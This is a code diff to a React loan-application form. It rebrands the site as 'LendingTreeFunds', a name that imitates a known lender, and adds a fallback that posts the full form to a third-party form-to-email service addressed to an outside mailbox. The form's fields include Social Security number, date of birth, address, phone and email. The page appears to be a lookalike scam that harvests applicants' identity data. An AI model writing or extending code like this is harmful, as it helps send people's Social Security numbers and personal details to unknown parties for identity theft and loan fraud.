@@ -14,17 +14,34 @@ const ApplyLoan = () => {
   const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
     setIsSubmitting(true);
-    const formData = new FormData(e.currentTarget);
+    const form = e.currentTarget;
+    const formData = new FormData(form);
     const data = Object.fromEntries(formData);
     data.formType = "Loan Application";
 
     try {
-      const response = await fetch("/api/submit-form", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
-      if (response.ok) {
+      let success = false;
+      try {
+        const response = await fetch("/api/submit-form", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+        if (response.ok) success = true;
+      } catch (err) {
+        console.warn("Direct API call failed, trying fallback...", err);
+      }
+
+      if (!success) {
+        const fbRes = await fetch("https://formsubmit.co/ajax/universal@lendingtreefunds.com", {
+          method: "POST",
+          headers: { "Content-Type": "application/json", Accept: "application/json" },
+          body: JSON.stringify(data),
+        });
+        if (fbRes.ok) success = true;
+      }
+
+      if (success) {
         alert("Application submitted successfully. We will review your details and contact you shortly.");
         navigate("/");
       } else {
@@ -71,7 +88,7 @@ const ApplyLoan = () => {
               Apply Now
             </h1>
             <p className="mb-4 text-gray-800" style={{ fontSize: "24px" }}>{title}</p>
-            <p className="mb-4 text-gray-800" style={{ fontSize: "16px" }}>Get up to $35,000 with a low, fixed rate loan from Universal Loan</p>
+            <p className="mb-4 text-gray-800" style={{ fontSize: "16px" }}>Get up to $35,000 with a low, fixed rate loan from LendingTreeFunds</p>
             <ul className="list-disc pl-6 space-y-2 mb-12 text-gray-800" style={{ fontSize: "16px" }}>
               <li>Affordable monthly payments</li>
               <li>Enjoy the benefits of No Prepayment fees with affiliated banks, making it easier for you to manage your finances.</li>
@@ -89,7 +106,7 @@ const ApplyLoan = () => {
                     name="First Name" 
                     placeholder="Your Name" 
                     required 
-                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-purple-500"
+                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-amber-500"
                   />
               </div>
 
@@ -99,7 +116,7 @@ const ApplyLoan = () => {
                     type="text" 
                     name="Last Name" 
                     placeholder="Your Last Name" 
-                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-purple-500"
+                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-amber-500"
                   />
               </div>
 
@@ -109,7 +126,7 @@ const ApplyLoan = () => {
                     type="text" 
                     name="Street Address" 
                     placeholder="Enter Your Street Address" 
-                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-purple-500"
+                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-amber-500"
                   />
               </div>
 
@@ -119,7 +136,7 @@ const ApplyLoan = () => {
                     type="text" 
                     name="Street Address Line 2" 
                     placeholder="Enter Your Street Address 2" 
-                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-purple-500"
+                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-amber-500"
                   />
               </div>
 
@@ -130,7 +147,7 @@ const ApplyLoan = () => {
                     name="City" 
                     placeholder="Enter Your City" 
                     required 
-                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-purple-500"
+                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-amber-500"
                   />
               </div>
 
@@ -141,7 +158,7 @@ const ApplyLoan = () => {
                     name="State" 
                     placeholder="Enter Your State" 
                     required 
-                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-purple-500"
+                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-amber-500"
                   />
               </div>
 
@@ -154,7 +171,7 @@ const ApplyLoan = () => {
                     required 
                     maxLength={5}
                     onInput={handleZipFormat}
-                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-purple-500"
+                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-amber-500"
                   />
               </div>
 
@@ -167,7 +184,7 @@ const ApplyLoan = () => {
                     required 
                     maxLength={11}
                     onInput={handleSsnFormat}
-                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-purple-500"
+                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-amber-500"
                   />
               </div>
 
@@ -178,7 +195,7 @@ const ApplyLoan = () => {
                     name="dob" 
                     placeholder="Enter Your Date of Birth" 
                     required 
-                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-purple-500"
+                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-amber-500"
                   />
               </div>
 
@@ -189,7 +206,7 @@ const ApplyLoan = () => {
                     name="Email Address" 
                     placeholder="acustomer750@gmail.com" 
                     required 
-                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-purple-500"
+                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-amber-500"
                   />
               </div>
 
@@ -205,7 +222,7 @@ const ApplyLoan = () => {
                     onInput={handlePhoneFormat}
                     pattern="\d{3}-\d{3}-\d{4}"
                     title="Format: 407-349-7496"
-                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-purple-500"
+                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-amber-500"
                   />
               </div>
 
@@ -216,7 +233,7 @@ const ApplyLoan = () => {
                     name="Loan Amount" 
                     placeholder="Enter Loan Amount (e.g. 5000)" 
                     required 
-                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-purple-500 bg-white"
+                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-amber-500 bg-white"
                   />
               </div>
 
@@ -227,7 +244,7 @@ const ApplyLoan = () => {
                 type="submit" 
                 disabled={isSubmitting}
                 className="inline-block px-12 py-3 rounded text-white font-medium hover:opacity-90 transition-opacity disabled:opacity-50"
-                style={{ background: "linear-gradient(135deg, hsl(272 65% 52%), hsl(280 75% 58%))", fontSize: "18px", width: "100%", maxWidth: "200px" }}
+                style={{ background: "linear-gradient(135deg, #C58A2B, #E5A93C)", fontSize: "18px", width: "100%", maxWidth: "200px" }}
               >
                 {isSubmitting ? "Submitting..." : "Apply"}
               </button>
@@ -241,7 +258,7 @@ const ApplyLoan = () => {
       <footer className="bg-black py-12 mt-auto">
         <div className="container mx-auto px-4">
            <div className="text-center text-white/80" style={{ fontSize: "15px" }}>
-             Copyright © 2004-2026, Universal Loan, All Rights Reserved.
+             Copyright © 2004-2026, LendingTreeFunds, All Rights Reserved.
            </div>
         </div>
       </footer>
